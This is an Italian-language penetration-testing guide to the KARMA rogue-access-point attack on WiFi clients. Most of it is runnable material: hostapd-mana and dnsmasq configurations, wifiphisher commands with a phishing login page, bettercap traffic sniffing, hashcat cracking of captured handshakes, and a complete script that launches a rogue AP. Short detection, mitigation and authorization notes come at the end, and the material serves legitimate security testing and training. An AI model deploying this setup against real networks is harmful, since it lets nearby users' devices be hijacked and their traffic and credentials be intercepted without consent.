# KARMA Attack

## Scopo

Questa guida copre l'attacco KARMA, una tecnica che sfrutta le probe request dei client WiFi per creare access point malevoli a cui i dispositivi si connettono automaticamente.

## Prerequisiti

- Scheda WiFi con monitor mode e AP mode
- Kali Linux
- hostapd-mana o WiFi Pineapple
- Conoscenza base 802.11
- **Autorizzazione per penetration testing**

## Installazione

```bash
# hostapd-mana
sudo apt-get update
sudo apt-get install hostapd-mana

# Alternativa: Airgeddon
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
```

---

## Come Funziona KARMA

```
1. Client invia probe request per reti salvate (PNL)
2. Attaccante cattura SSID richiesti
3. Access Point risponde a TUTTE le probe request
4. Client si connette credendo sia rete legittima
5. Attaccante intercetta traffico
```

### Probe Request

```
Client → Broadcast: "C'è HomeWiFi?"
Client → Broadcast: "C'è OfficeNetwork?"
KARMA AP → Client: "Sì, sono HomeWiFi!"
KARMA AP → Client: "Sì, sono OfficeNetwork!"
Client → KARMA AP: Connessione!
```

---

## hostapd-mana

### Configurazione Base

```bash
# /etc/hostapd-mana/hostapd-mana.conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=6
ssid=FreeWiFi
mana_wpaout=/tmp/mana_wpa.hccapx
enable_mana=1
mana_loud=1
```

### Avvio

```bash
sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

### KARMA Mode

```bash
# Risponde a tutte le probe
mana_loud=1

# Solo ACL (whitelist SSID)
mana_loud=0
mana_macacl=1
```

### Con DHCP

```bash
# dnsmasq
interface=wlan1
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# Start
sudo dnsmasq -C dnsmasq.conf
```

---

## WiFi Pineapple

```
1. Accedi web interface
2. PineAP → Enable PineAP
3. Abilita Beacon Response
4. Probe Response
5. Harvester (cattura SSID)
6. Dogma (auto-response)
```

---

## Wifiphisher KARMA

```bash
# KARMA mode automatico
sudo wifiphisher -aI wlan1 -e FreeWifi --known-beacons

# Con phishing page
sudo wifiphisher -aI wlan1 --known-beacons -p oauth-login
```

---

## Mana Toolkit

```bash
# Clone
git clone https://github.com/sensepost/mana.git
cd mana

# Setup
./run-mana/start-nat-simple.sh

# Avanzato con EAP
./run-mana/start-nat-full.sh
```

---

## Airgeddon

```bash
cd airgeddon
sudo bash airgeddon.sh

# Menu:
# 7. Evil Twin attacks
# 8. KARMA attack
```

---

## Cattura Credenziali

### HTTP

```bash
# hostapd-mana genera automaticamente log
# oppure usa intercettazione proxy

# bettercap
sudo bettercap -iface wlan1
> net.sniff on
> http.proxy on
```

### WPA Handshake

```bash
# mana cattura EAP handshakes
mana_wpaout=/tmp/mana_wpa.hccapx

# Crack con hashcat
hashcat -m 22000 mana_wpa.hccapx wordlist.txt
```

---

## Script Automatizzato

```bash
#!/bin/bash
# karma_attack.sh

IFACE="wlan1"
IP="192.168.100.1"
DHCP_RANGE="192.168.100.50,192.168.100.150"

# Setup interfaccia
sudo ip link set $IFACE up
sudo ip addr add $IP/24 dev $IFACE

# hostapd-mana config
cat > /tmp/karma.conf << EOF
interface=$IFACE
driver=nl80211
hw_mode=g
channel=6
ssid=FreeInternet
enable_mana=1
mana_loud=1
EOF

# dnsmasq config
cat > /tmp/dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$IP
dhcp-option=6,$IP
log-queries
log-dhcp
EOF

# Start services
sudo dnsmasq -C /tmp/dnsmasq.conf &
sudo hostapd-mana /tmp/karma.conf
```

---

## Detection KARMA

### Indicatori

- AP che risponde a qualsiasi SSID
- Beacon con SSID diversi dallo stesso BSSID
- MAC address sospetto (random)

### Protezioni Client

```
- Disabilita auto-connect
- Rimuovi SSID dal PNL
- Usa randomizzazione MAC
- Verifica rete prima di connettersi
```

---

## Mitigazioni

### Lato Client

```
Windows:
- Impostazioni WiFi → "Connetti automaticamente" OFF

iOS/Android:
- Dimentica reti non usate
- Disabilita WiFi quando non serve
```

### Lato Enterprise

```
- WPA3-SAE (resistente a KARMA)
- 802.1X (EAP-TLS)
- Certificate pinning
- Client isolation
- WIDS per detection
```

---

## Best Practices

- **Lab only**: Mai in produzione senza autorizzazione
- **Scope definito**: Limite geografico e temporale
- **Monitoraggio**: Log tutto il traffico intercettato
- **Ethical**: Non usare credenziali catturate
- **Report**: Documenta per awareness training

## Riferimenti

- [hostapd-mana](https://github.com/sensepost/hostapd-mana)
- [Mana Toolkit](https://github.com/sensepost/mana)
- [WiFi Pineapple](https://shop.hak5.org/products/wifi-pineapple)
- [KARMA Attack Paper](https://dankaminsky.com/2005/10/10/karma/)
